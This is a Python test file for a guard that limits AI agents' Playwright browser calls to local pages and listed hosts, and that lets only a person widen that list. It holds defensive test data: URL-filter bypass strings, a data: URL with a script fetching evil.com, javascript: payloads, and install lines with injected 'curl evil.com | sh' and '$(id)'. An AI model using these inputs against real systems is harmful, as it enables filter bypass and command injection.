"""The browser check: a Playwright MCP call opens only local pages, or a host `agents.browser_hosts` lists.

Playwright MCP's `browser_navigate` and `browser_tabs` take a `url` (`@playwright/mcp@0.0.82`). The guard reads that
address as the browser would, compares the host it parsed, and denies what it cannot read with certainty.
"""

import io
import itertools
import json
import re
import tempfile
import unittest
from pathlib import Path

from helpers import ROOT, RepoTemplateCase, make_repo

from aidd import config
from aidd.config import extends_merge
from aidd.guard import browser_pages, decision_files, delegation, dialects, pre_tool, repo_config
from aidd.kernel import json_schema
from aidd.setup import hook_wiring

NAVIGATE = "mcp__plugin_playwright_playwright__browser_navigate"
ALLOWED = (
    "file:///Users/x/proj/index.html",
    "file:/tmp/a.html",
    "file://localhost/tmp/a.html",
    "about:blank",
    "http://localhost:5173/",
    "https://localhost",
    "HTTP://LOCALHOST:3000/a?b=c#d",
    "http://127.0.0.1:8080/x",
    "http://[::1]:3000/",
    "http://app.localhost:3000",
    "http://shop.test/cart",
    "https://a.b.test:8443",
    "http://my_app.test",
    "127.0.0.1:5173/x",  # no scheme: Playwright reads it as https://127.0.0.1:5173/x
    "localhost/x",  # no scheme, starts with localhost: http://localhost/x
    "http://localhost?next=http://evil.com",
    "http://localhost#@evil.com",
)
DENIED = (
    "https://example.com",
    "http://localhost.evil.com/",
    "http://evil.com/localhost",
    "http://localhost@evil.com/",  # userinfo: the host is evil.com
    "http://evil.com@localhost/",
    "http://user:pw@localhost:3000/",
    "http://localhost:80@evil.com/",
    "http://localhost\\@evil.com/",
    "http://localhost%2eevil.com",
    "http://localhost%00.evil.com",
    "http://localhost.",
    "http://127.1/",
    "http://2130706433/",
    "http://0x7f.0.0.1/",
    "http://127.0.0.1.nip.io/",
    "http://[::ffff:127.0.0.1]/",
    "http://[::2]/",
    "http://[::1%25eth0]/",
    "http://ｌocalhost/",  # a full-width letter: an international name
    "http://xn--localhost-.example/",
    "http://localhost:99999/",
    "http://localhost:abc/",
    "http://localhost:/",
    "http:evil.com",
    "http:///evil.com",
    "http:////evil.com",
    "//evil.com",
    "evil.com",
    "localhost:3000",  # a scheme named localhost, which is no page
    "file://evil.com/share/a.html",
    "file:////server/share/a.html",
    "file:",
    "about:srcdoc",
    "data:text/html,<script>fetch('http://evil.com')</script>",
    "javascript:alert(1)",
    "JavaScript:alert(1)",
    "blob:http://localhost/1234",
    "view-source:http://localhost/",
    "chrome://settings",
    "ftp://localhost/",
    "ws://localhost/",
    "http://localhost/ x",
    " http://localhost/",
    "http://localhost/\nx",
    "http://",
    "",
    "   ",
)


def why_of(name: str, tool_input: object, listed: tuple[str, ...] = ()) -> str | None:
    """The reason a Playwright MCP call is refused (browser_pages.refusal), or None when it is allowed."""
    found = browser_pages.refusal(name, tool_input, listed)
    return found[0] if found else None


class ToolNameTests(unittest.TestCase):
    def test_a_tool_is_read_by_its_ending_in_every_harness_s_naming(self):
        for name, tool in (
            ("mcp__plugin_playwright_playwright__browser_navigate", "browser_navigate"),
            ("mcp__opencode__playwright_browser_navigate", "browser_navigate"),
            ("mcp__opencode__browser_browser_navigate", "browser_navigate"),
            ("mcp__opencode__pw_browser_tabs", "browser_tabs"),
            ("mcp__opencode__playwright_browser_run_code_unsafe", "browser_run_code_unsafe"),
            ("mcp__playwright__BROWSER_RUN_CODE", "browser_run_code"),
        ):
            self.assertEqual(browser_pages.tool_of(name), tool, name)
            self.assertTrue(browser_pages.is_browser_tool(name), name)
        for name in ("mcp__github__get_file", "mcp__opencode__github_browser_extension_tabs_x", "mcp__chrome__take_screenshot"):
            self.assertFalse(browser_pages.is_browser_tool(name), name)

    def test_every_code_tool_is_refused_whatever_its_prefix(self):
        for name in ("mcp__opencode__playwright_browser_run_code_unsafe", "mcp__x__browser_run_code", "mcp__playwright__browser_run_code_unsafe"):
            why = why_of(name, {"code": "x"})
            assert why is not None
            self.assertIn("Use `browser_evaluate` to read the page instead", why)


class AddressTests(unittest.TestCase):
    def test_each_allowed_form_is_allowed(self):
        for address in ALLOWED:
            with self.subTest(address=address):
                self.assertIsNone(browser_pages.why_denied(address), address)

    def test_each_denied_form_is_denied_with_a_reason(self):
        for address in DENIED:
            with self.subTest(address=address):
                self.assertIsInstance(browser_pages.why_denied(address), str)

    def test_the_scheme_is_read_without_regard_to_case_everywhere(self):
        for address in ("ABOUT:BLANK", "About:Blank", "FILE:///tmp/a.html", "HTTPS://LOCALHOST"):
            self.assertIsNone(browser_pages.why_denied(address), address)
        self.assertIsNotNone(browser_pages.why_denied("ABOUT:SRCDOC"))

    def test_an_input_nested_past_the_limit_is_refused_not_passed(self):
        deep: dict = {"url": "https://example.com"}
        for _ in range(browser_pages.MAX_DEPTH + 2):
            deep = {"a": deep}
        why = why_of("mcp__playwright__browser_fill_form", deep)
        assert why is not None
        self.assertIn("nested too deeply", why)
        shallow = {"a": {"b": {"url": "https://example.com"}}}
        self.assertIsNotNone(why_of("mcp__playwright__browser_fill_form", shallow))
        self.assertIsNone(why_of("mcp__playwright__browser_fill_form", {"a": {"b": {"c": "x"}}}))

    def test_what_is_not_text_cannot_be_read_and_is_denied(self):
        for address in (None, 5, ["http://localhost"], {"u": "http://localhost"}, b"http://localhost"):
            self.assertIsNotNone(browser_pages.why_denied(address), address)

    def test_the_hosts_a_project_lists_are_exact_hostnames(self):
        listed = ("preview.example.com",)
        self.assertIsNone(browser_pages.why_denied("https://preview.example.com/a", listed))
        self.assertIsNone(browser_pages.why_denied("http://PREVIEW.example.com:8443", listed))
        for address in (
            "https://example.com",
            "https://evil.preview.example.com",
            "https://preview.example.com.evil.com",
            "https://preview.example.com@evil.com",
        ):
            self.assertIsNotNone(browser_pages.why_denied(address, listed), address)
        # A listed host opens http and https pages only: the other schemes stay denied.
        self.assertIsNotNone(browser_pages.why_denied("ftp://preview.example.com", listed))
        self.assertIsNotNone(browser_pages.why_denied("preview.example.com\\x", listed))

    def test_a_call_names_the_address_and_the_next_step(self):
        why = why_of(NAVIGATE, {"url": "https://example.com/p"})
        assert why is not None
        self.assertIn("browser_navigate", why)
        self.assertIn("`https://example.com/p`", why)
        self.assertIn("ask the person to add the host to `agents.browser_hosts`", why)
        self.assertIn("open a local preview", why)

    def test_a_long_or_odd_address_is_shown_short_and_plain(self):
        why = why_of(NAVIGATE, {"url": "https://e.com/" + "a" * 500 + "`\x1b[31m"})
        assert why is not None
        self.assertLess(len(why), 600)
        self.assertNotIn("\x1b", why)

    def test_browser_tabs_checks_a_url_only_when_it_names_one(self):
        tabs = "mcp__playwright__browser_tabs"
        self.assertIsNone(why_of(tabs, {"action": "list"}))
        self.assertIsNone(why_of(tabs, {"action": "new"}))
        self.assertIsNone(why_of(tabs, {"action": "new", "url": "http://localhost:3000"}))
        self.assertIsNotNone(why_of(tabs, {"action": "new", "url": "https://example.com"}))

    def test_any_other_tool_of_the_server_that_takes_a_url_is_checked(self):
        for name in ("mcp__playwright__browser_open", "mcp__plugin_playwright_playwright__browser_future_tool", "mcp__opencode__playwright_browser_open"):
            self.assertIsNotNone(why_of(name, {"url": "https://example.com"}), name)
            self.assertIsNotNone(why_of(name, {"nested": {"URL": "https://example.com"}}), name)
            self.assertIsNotNone(why_of(name, {"url": ["http://localhost", "https://example.com"]}), name)
            self.assertIsNone(why_of(name, {"url": "http://localhost"}), name)
            self.assertIsNone(why_of(name, {"element": "button", "ref": "e3"}), name)

    def test_a_server_without_playwright_in_its_name_is_checked_by_its_tool(self):
        self.assertIsNotNone(why_of("mcp__pw__browser_navigate", {"url": "https://example.com"}))
        self.assertIsNone(why_of("mcp__github__get_file", {"url": "https://example.com"}))


class MatcherTests(unittest.TestCase):
    @staticmethod
    def matches(tool: str) -> bool:
        """The matcher holds whether Claude Code anchors it or not."""
        full, anywhere = re.fullmatch(hook_wiring.HOOK_MATCHER, tool) is not None, re.search(hook_wiring.HOOK_MATCHER, tool) is not None
        assert full == anywhere or not full, tool
        return full

    def test_the_navigate_tools_reach_the_guard_under_any_server_name(self):
        for server in ("plugin_playwright_playwright", "playwright", "pw", "Playwright"):
            for tool in hook_wiring.BROWSER_GUARDED_TOOLS:
                self.assertTrue(self.matches(f"mcp__{server}__{tool}"), (server, tool))

    def test_the_other_browser_tools_still_skip_it(self):
        for tool in ("browser_click", "browser_press_key", "browser_snapshot", "browser_navigate_back", "browser_tabs_list", "browser_take_screenshot"):
            self.assertFalse(self.matches(f"mcp__plugin_playwright_playwright__{tool}"), tool)

    def test_the_plugin_matcher_is_the_one_init_writes(self):
        hooks = json.loads((ROOT / "hooks" / "hooks.json").read_text(encoding="utf-8"))["hooks"]["PreToolUse"]
        self.assertEqual(hooks[0]["matcher"], hook_wiring.HOOK_MATCHER)

    def test_the_urls_tools_are_those_the_pinned_server_has(self):
        """The pin in schemas/roles.json names @playwright/mcp@0.0.82; its tools that take a `url` are these two."""
        roles = (ROOT / "schemas" / "roles.json").read_text(encoding="utf-8")
        self.assertIn("@playwright/mcp@0.0.82", roles)
        self.assertEqual(hook_wiring.BROWSER_GUARDED_TOOLS, (*browser_pages.URL_TOOLS, *browser_pages.CODE_TOOLS))


class GuardTests(RepoTemplateCase):
    @classmethod
    def build_template(cls, root):
        make_repo(root, "team")

    def guard(self, event: dict) -> tuple[str, str]:
        out = io.StringIO()
        self.assertEqual(pre_tool.pre_tool_hook(io.StringIO(json.dumps({"cwd": str(self.root), **event})), out), 0)
        if not out.getvalue():
            return "allow", ""
        answer = json.loads(out.getvalue())
        spec = answer.get("hookSpecificOutput") or answer
        decision = spec.get("permissionDecision") or spec.get("decision") or "allow"
        return decision, spec.get("permissionDecisionReason") or spec.get("reason") or spec.get("additionalContext") or ""

    def claude(self, url, tool="browser_navigate", agent="aidd-team:product-designer"):
        return self.guard(
            {
                "hook_event_name": "PreToolUse",
                "tool_name": f"mcp__plugin_playwright_playwright__{tool}",
                "tool_input": {"url": url},
                "agent_id": "a1",
                "agent_type": agent,
            }
        )

    def list_hosts(self, *hosts: str) -> None:
        cfg = self.root / ".aidd" / "config.yaml"
        cfg.write_text(cfg.read_text(encoding="utf-8") + f"\nagents:\n  browser_hosts: [{', '.join(hosts)}]\n", encoding="utf-8")

    def test_a_local_page_goes_through_and_another_is_denied_with_the_next_step(self):
        self.assertEqual(self.claude("http://localhost:5173/")[0], "allow")
        decision, reason = self.claude("https://example.com/")
        self.assertEqual(decision, "deny")
        self.assertIn("`https://example.com/`", reason)
        self.assertIn("agents.browser_hosts", reason)

    def test_a_role_and_a_helper_are_denied_in_enforce_mode_and_the_lead_is_told(self):
        for agent in ("aidd-team:verifier", "Explore"):
            self.assertEqual(self.claude("https://example.com", agent=agent)[0], "deny", agent)
        decision, note = self.claude("https://example.com", agent="")
        self.assertEqual(decision, "allow")
        self.assertIn("your own session", note)
        self.assertIn("`https://example.com`", note)

    def test_the_userinfo_trick_and_an_unreadable_address_are_denied(self):
        for url in ("http://localhost@evil.com/", "data:text/html,x", "javascript:alert(1)", "blob:http://localhost/1", "http://[::1", 7):
            self.assertEqual(self.claude(url)[0], "deny", url)

    def test_a_tab_with_a_url_is_checked(self):
        self.assertEqual(self.claude("https://example.com", tool="browser_tabs")[0], "deny")
        self.assertEqual(self.claude("http://localhost:3000", tool="browser_tabs")[0], "allow")

    def test_a_host_the_config_lists_is_allowed(self):
        self.list_hosts("preview.example.com")
        self.assertEqual(self.claude("https://preview.example.com/a")[0], "allow")
        self.assertEqual(self.claude("https://example.com/a")[0], "deny")
        self.assertEqual(self.claude("https://preview.example.com@evil.com/a")[0], "deny")

    def test_a_config_the_guard_cannot_read_lists_no_host(self):
        self.list_hosts("preview.example.com")
        cfg = self.root / ".aidd" / "config.yaml"
        cfg.write_text(cfg.read_text(encoding="utf-8") + "\nunknown_key_the_schema_refuses: true\n", encoding="utf-8")
        self.assertEqual(self.claude("https://preview.example.com/a")[0], "deny")

    def test_a_repository_that_never_adopted_aidd_is_left_alone(self):
        (self.root / ".aidd" / "config.yaml").unlink()
        self.assertEqual(self.claude("https://example.com")[0], "allow")

    def test_the_other_harnesses_read_the_same_rule(self):
        antigravity = {
            "agentName": "aidd-verifier",
            "toolCall": {
                "name": "mcp_tool",
                "args": {"ServerName": "playwright", "ToolName": "browser_navigate", "Arguments": json.dumps({"url": "https://example.com"})},
            },
            "conversationId": "c1",
            "workspacePaths": [str(self.root)],
        }
        opencode = {
            "harness": "opencode",
            "tool": "playwright_browser_navigate",
            "input": {"url": "https://example.com"},
            "sessionID": "s",
            "agent": "aidd-verifier",
        }
        grok = {
            "hookEventName": "pre_tool_use",
            "toolName": "playwright__browser_navigate",
            "toolInput": {"url": "https://example.com"},
            "sessionId": "s",
            "subagentType": "aidd-team:verifier",
        }
        codex = {
            "hook_event_name": "PreToolUse",
            "turn_id": "t",
            "tool_name": "mcp__playwright__browser_navigate",
            "tool_input": {"url": "https://example.com"},
            "session_id": "s",
            "agent_type": "aidd-team:verifier",
        }
        opencode_code = opencode | {"tool": "playwright_browser_run_code_unsafe", "input": {"code": "async (page) => 1"}}
        opencode_bare = opencode | {"tool": "browser_browser_navigate"}
        opencode_tabs = opencode | {"tool": "pw_browser_tabs", "input": {"action": "new", "url": "https://example.com"}}
        for name, event in (
            ("antigravity", antigravity),
            ("opencode", opencode),
            ("opencode", opencode_code),
            ("opencode", opencode_bare),
            ("opencode", opencode_tabs),
            ("grok", grok),
            ("codex", codex),
        ):
            with self.subTest(harness=name):
                self.assertEqual(dialects.of(event).key, {"grok": "grok-build"}.get(name, name))
                decision, reason = self.guard(event | {"cwd": str(self.root)})
                self.assertEqual(decision, "deny", reason)
                self.assertTrue("agents.browser_hosts" in reason or "browser_evaluate" in reason, reason)


class WhoActsTests(unittest.TestCase):
    """The browser rule binds by who acts and by the mode: a role or a helper, which work without the person, follow the
    mode (deny in enforce and audited, a note in advisory); the lead, the person's own session, is told in advisory and
    enforce and denied only under the audited profile. A local address passes everywhere, with no note."""

    ACTORS = {"role": "aidd-team:verifier", "helper": "Explore", "lead": None}
    REMOTE = ("browser_navigate", {"url": "https://example.com/a"})
    CODE = ("browser_run_code_unsafe", {"code": "async (page) => page.goto('https://example.com')"})
    LOCAL = ("browser_navigate", {"url": "http://localhost:5173/"})
    # (profile, enforce): advisory is the team default; enforce is `mode: enforce`; audited enforces by profile.
    MODES = {"advisory": ("team", False), "enforce": ("team", True), "audited": ("audited", True)}
    sessions = itertools.count(1)  # each ask is a new session, so the note that comes once for each host comes
    DENY, NOTE, QUIET = "deny", "note", "quiet"
    EXPECTED = {
        ("role", "advisory"): NOTE,
        ("helper", "advisory"): NOTE,
        ("lead", "advisory"): NOTE,
        ("role", "enforce"): DENY,
        ("helper", "enforce"): DENY,
        ("lead", "enforce"): NOTE,
        ("role", "audited"): DENY,
        ("helper", "audited"): DENY,
        ("lead", "audited"): DENY,
    }

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.dirs = {}
        for mode, (profile, enforce) in cls.MODES.items():
            tmp = tempfile.TemporaryDirectory()
            cls.addClassCleanup(tmp.cleanup)
            cls.dirs[mode] = make_repo(Path(tmp.name).resolve() / "repo", profile, enforce=enforce)

    def ask(self, mode: str, actor: str, call: tuple[str, dict], session: str | None = None) -> tuple[str, str]:
        tool, tool_input = call
        event = {
            "cwd": str(self.dirs[mode]),
            "hook_event_name": "PreToolUse",
            "permission_mode": "default",
            "transcript_path": "/tmp/t.jsonl",
            "session_id": session or f"s{next(self.sessions)}",
            "tool_name": f"mcp__plugin_playwright_playwright__{tool}",
            "tool_input": tool_input,
        }
        if self.ACTORS[actor]:
            event |= {"agent_id": "a1", "agent_type": self.ACTORS[actor]}
        out = io.StringIO()
        self.assertEqual(pre_tool.pre_tool_hook(io.StringIO(json.dumps(event)), out), 0)
        spec = json.loads(out.getvalue())["hookSpecificOutput"] if out.getvalue() else {}
        if spec.get("permissionDecision") == "deny":
            return self.DENY, spec["permissionDecisionReason"]
        return (self.NOTE, spec["additionalContext"]) if spec.get("additionalContext") else (self.QUIET, "")

    def test_the_matrix_of_who_acts_and_the_mode(self):
        for (actor, mode), expected in self.EXPECTED.items():
            for name, call in (("remote", self.REMOTE), ("run_code", self.CODE)):
                with self.subTest(actor=actor, mode=mode, call=name):
                    kind, text = self.ask(mode, actor, call)
                    self.assertEqual(kind, expected, text)
                    if name == "remote":
                        self.assertIn("`https://example.com/a`", text)
                        if kind == self.DENY:
                            self.assertIn(
                                "open a local preview (serve the page on `http://localhost:<port>`, or a `*.localhost` or `*.test` host), or ask the person to add the host to `agents.browser_hosts` in .aidd/config.yaml",
                                text,
                            )
                    else:
                        self.assertIn("`browser_run_code_unsafe` runs any code and can open any address", text)
                        self.assertIn("Use `browser_evaluate` to read the page instead", text)

    def test_a_local_page_passes_in_every_cell_with_no_note(self):
        for actor in self.ACTORS:
            for mode in self.MODES:
                with self.subTest(actor=actor, mode=mode):
                    self.assertEqual(self.ask(mode, actor, self.LOCAL), (self.QUIET, ""))

    def test_a_main_thread_started_as_a_role_is_a_role(self):
        """`claude --agent aidd-team:verifier` runs the role as the main thread (no `agent_id`); `holds` reads it as a role."""
        event = {"permission_mode": "default", "transcript_path": "/tmp/t.jsonl", "session_id": "m1", "agent_type": "aidd-team:verifier"}
        self.assertTrue(delegation.acts_alone(str(self.dirs["enforce"]), event))
        self.assertFalse(delegation.acts_alone(str(self.dirs["enforce"]), event | {"agent_type": "my-own-agent"}))  # another agent: the person's session
        out = io.StringIO()
        full = event | {
            "cwd": str(self.dirs["enforce"]),
            "hook_event_name": "PreToolUse",
            "tool_name": "mcp__playwright__browser_navigate",
            "tool_input": {"url": "https://example.com"},
        }
        pre_tool.pre_tool_hook(io.StringIO(json.dumps(full)), out)
        self.assertEqual(json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"], "deny")
        out = io.StringIO()
        pre_tool.pre_tool_hook(io.StringIO(json.dumps(full | {"agent_type": "my-own-agent"})), out)
        self.assertIn("your own session", json.loads(out.getvalue())["hookSpecificOutput"]["additionalContext"])

    def test_an_unreadable_lease_file_holds_every_lead_like_a_role(self):
        from aidd.autopilot import lease, store

        root = self.dirs["enforce"]
        path = store.lease_store(str(root)) / lease.LEASE_FILE
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("not json", encoding="utf-8")
        try:
            self.assertEqual(self.ask("enforce", "lead", self.REMOTE, "any-lead")[0], self.DENY)
            self.assertEqual(self.ask("enforce", "lead", self.LOCAL, "any-lead"), (self.QUIET, ""))
        finally:
            path.unlink()
        self.assertEqual(self.ask("enforce", "lead", self.REMOTE, "any-lead2")[0], self.NOTE)

    def test_an_ended_lease_holds_its_lead_until_autopilot_stops(self):
        from aidd.autopilot import lease

        root = self.dirs["enforce"]
        taken, _ = lease.take_lease(str(root), work="SPEC-1", session_id="ended-1")
        lease.record_event(str(root), "finished", taken, reason="nothing_open")
        try:
            self.assertEqual(self.ask("enforce", "lead", self.REMOTE, "ended-1")[0], self.DENY)
            self.assertEqual(self.ask("enforce", "lead", self.REMOTE, "other-lead")[0], self.NOTE)
        finally:
            lease.release_lease(str(root), session_id="ended-1")
        self.assertEqual(self.ask("enforce", "lead", self.REMOTE, "ended-1")[0], self.NOTE)

    def test_a_lead_that_runs_autopilot_is_held_like_a_role(self):
        from aidd.autopilot import lease

        root = self.dirs["enforce"]
        self.assertEqual(self.ask("enforce", "lead", self.REMOTE, "plain")[0], self.NOTE)
        lease.take_lease(str(root), work="SPEC-1", session_id="auto-1")
        try:
            for call in (self.REMOTE, self.CODE):
                self.assertEqual(self.ask("enforce", "lead", call, "auto-1")[0], self.DENY)
            self.assertEqual(self.ask("enforce", "lead", self.LOCAL, "auto-1"), (self.QUIET, ""))
            self.assertEqual(self.ask("enforce", "lead", self.REMOTE, "someone-else")[0], self.NOTE)
            self.assertEqual(self.ask("advisory", "lead", self.REMOTE, "auto-1")[0], self.NOTE)  # another repository: no lease there
        finally:
            lease.release_lease(str(root), session_id="auto-1")

    def test_a_note_comes_once_for_each_host_in_a_session(self):
        first = self.ask("advisory", "lead", self.REMOTE, "once")
        again = self.ask("advisory", "lead", self.REMOTE, "once")
        other = self.ask("advisory", "lead", ("browser_navigate", {"url": "https://other.example.org/"}), "once")
        self.assertEqual((first[0], again, other[0]), (self.NOTE, (self.QUIET, ""), self.NOTE))
        self.assertEqual(self.ask("advisory", "lead", self.CODE, "once")[0], self.NOTE)
        self.assertEqual(self.ask("advisory", "lead", self.CODE, "once"), (self.QUIET, ""))

    def test_a_note_says_which_rule_applies(self):
        self.assertIn("advisory mode, so this goes through", self.ask("advisory", "role", self.REMOTE)[1])
        self.assertIn("advisory mode, so this goes through", self.ask("advisory", "lead", self.REMOTE)[1])
        self.assertIn("your own session, so this goes through", self.ask("enforce", "lead", self.REMOTE)[1])


class LiveCheckTests(unittest.TestCase):
    def pre(self, url: str) -> dict:
        return {"hook": "pre-tool", "event": {"tool_name": NAVIGATE, "tool_input": {"url": url}, "session_id": "s", "hook_event_name": "PreToolUse"}}

    def test_a_session_without_playwright_skips_the_browser_part_and_says_so(self):
        from aidd.guard import live_hooks

        verdict, said = live_hooks._browsed([])
        self.assertEqual(verdict, "unseen")
        self.assertIn("skipped", said)

    def test_a_local_file_is_read_as_allowed_and_a_remote_address_as_denied(self):
        from aidd.guard import live_hooks

        self.assertEqual(live_hooks._browsed([self.pre("file:///tmp/r/README.md"), self.pre("https://example.com")])[0], "ok")
        self.assertEqual(live_hooks._browsed([self.pre("https://example.com"), self.pre("http://localhost:3000")])[0], "fail")


def knowledge_adds() -> list[str]:
    from aidd import knowledge

    return [adds for r in knowledge.suggestions(set()) if r["name"] == "Playwright MCP" for adds in r["adds"].values()]


class InstallLineTests(unittest.TestCase):
    """The Playwright MCP install line starts the server with the local origins only (`--allowed-origins`, which the server
    enforces beside the guard), and `aidd extensions suggest` shows it."""

    LINE = (
        "claude mcp add playwright -- npx -y @playwright/mcp@0.0.82 --allowed-origins "
        '"localhost;localhost:*;127.0.0.1;127.0.0.1:*;[::1];[::1]:*;*.localhost;*.localhost:*;*.test;*.test:*"'
    )

    def test_each_role_that_uses_the_browser_gets_the_line(self):
        from aidd import knowledge

        rows = [r for r in knowledge.suggestions(set()) if r["name"] == "Playwright MCP"]
        self.assertEqual([r["install"] for r in rows], [self.LINE])
        self.assertEqual(set(rows[0]["roles"]), {"product-designer", "developer", "verifier"})
        for adds in rows[0]["adds"].values():
            self.assertIn("a team adds its `agents.browser_hosts` there too", adds)
        text = knowledge.suggestions_text(rows, set())
        self.assertIn(self.LINE, text)
        self.assertNotIn("marketplace add", text)  # an MCP server names no marketplace

    def test_each_install_line_names_the_package_and_version_its_pin_names(self):
        roles = json.loads((ROOT / "schemas" / "roles.json").read_text(encoding="utf-8"))["roles"]
        seen = []
        for role, data in roles.items():
            for e in data.get("extends", []):
                if e["name"] == "Playwright MCP":
                    seen.append(role)
                    package_at_version = e["pin"].split(" ", 1)[0]
                    self.assertIn(f" {package_at_version} ", e["install"] + " ", role)
        self.assertEqual(set(seen), {"product-designer", "developer", "verifier"})

    def test_the_text_does_not_promise_a_boundary(self):
        for adds in knowledge_adds():
            self.assertIn("no security boundary and does not stop redirects", adds)

    def test_the_origins_are_the_ones_the_guard_allows(self):
        origins = self.LINE.split('"')[1].split(";")
        hosts = {o.rsplit(":*", 1)[0] for o in origins}
        self.assertEqual(hosts, {"localhost", "127.0.0.1", "[::1]", "*.localhost", "*.test"})
        for host in hosts:
            probe = host.replace("*", "app")
            self.assertIsNone(browser_pages.why_denied(f"http://{probe}:5173/" if not probe.startswith("[") else "http://[::1]:5173/"), host)

    def test_the_schema_takes_this_line_and_not_a_loose_one(self):
        schema = json.loads((ROOT / "schemas" / "roles.schema.json").read_text(encoding="utf-8"))

        def find(node):
            if isinstance(node, dict):
                if "install" in node.get("properties", {}):
                    return node["properties"]["install"]["pattern"]
                for v in node.values():
                    if (found := find(v)) is not None:
                        return found
            if isinstance(node, list):
                for v in node:
                    if (found := find(v)) is not None:
                        return found
            return None

        pattern = re.compile(find(schema))
        self.assertTrue(pattern.fullmatch(self.LINE))
        self.assertTrue(pattern.fullmatch("claude plugin install design@knowledge-work-plugins"))
        for bad in (self.LINE + "; curl evil.com | sh", self.LINE + " $(id)", "claude mcp add x -- sh -c id", "claude mcp add x -- npx -y evil"):
            self.assertIsNone(pattern.fullmatch(bad), bad)


class HostListTests(unittest.TestCase):
    BASE = 'aidd_version: "1.0.0"\nprofile: "team"\n'

    def test_the_schema_takes_exact_hostnames_only(self):
        for good in (["preview.example.com"], ["a.b-c.example"], []):
            data = {"aidd_version": "1.0.0", "profile": "team", "agents": {"browser_hosts": good}}
            self.assertEqual(json_schema.validate(data, "config.schema.json"), [], good)
        for bad in (["https://preview.example.com"], ["Preview.Example.com"], ["*.example.com"], ["a.com:8080"], ["a.com/x"], ["a.com", "a.com"]):
            data = {"aidd_version": "1.0.0", "profile": "team", "agents": {"browser_hosts": bad}}
            self.assertNotEqual(json_schema.validate(data, "config.schema.json"), [], bad)

    def test_an_entry_that_is_not_a_hostname_opens_nothing(self):
        raw = {"agents": {"browser_hosts": ["ok.example.com", "https://x.com", "UP.com", 5, "a" * 300]}}
        self.assertEqual(config.browser_hosts(raw), ("ok.example.com",))
        self.assertEqual(config.browser_hosts({"agents": {"browser_hosts": "x.com"}}), ())
        self.assertEqual(config.browser_hosts({}), ())

    def test_an_agent_s_edit_that_adds_a_host_is_a_loosening_and_a_removal_is_not(self):
        old = self.BASE + "agents:\n  browser_hosts: [a.example.com]\n"
        added = self.BASE + "agents:\n  browser_hosts: [a.example.com, b.example.com]\n"
        removed = self.BASE + "agents:\n  browser_hosts: []\n"
        first = self.BASE + "agents:\n  browser_hosts: [a.example.com]\n"
        self.assertEqual(decision_files.config_loosening(config.CONFIG_PATH, old, added), decision_files.BROWSER_HOSTS_DENY)
        self.assertEqual(decision_files.config_loosening(config.CONFIG_PATH, self.BASE, first), decision_files.BROWSER_HOSTS_DENY)
        self.assertEqual(
            decision_files.decision_change("/nonexistent", config.CONFIG_PATH, old, added, subagent=True),
            "only a person adds a host: ask them to add it to `agents.browser_hosts` in .aidd/config.yaml",
        )
        self.assertIsNone(decision_files.config_loosening(config.CONFIG_PATH, old, removed))
        self.assertTrue(repo_config.looser_text(old, added))
        self.assertFalse(repo_config.looser_text(added, old))

    def test_a_child_config_cannot_add_a_host_to_a_parent_s_list(self):
        warnings: list[str] = []
        parent = {"agents": {"browser_hosts": ["a.example.com", "b.example.com"]}}
        merged = extends_merge.merge(parent, {"agents": {"browser_hosts": ["b.example.com", "c.example.com"]}}, where="child", warnings=warnings)
        self.assertEqual(merged["agents"]["browser_hosts"], ["b.example.com"])
        self.assertTrue(any("cannot add ['c.example.com']" in w for w in warnings), warnings)
        # A parent that lists none leaves the project's own list as it is.
        alone = extends_merge.merge({"agents": {}}, {"agents": {"browser_hosts": ["c.example.com"]}}, where="child", warnings=[])
        self.assertEqual(alone["agents"]["browser_hosts"], ["c.example.com"])


if __name__ == "__main__":
    unittest.main()
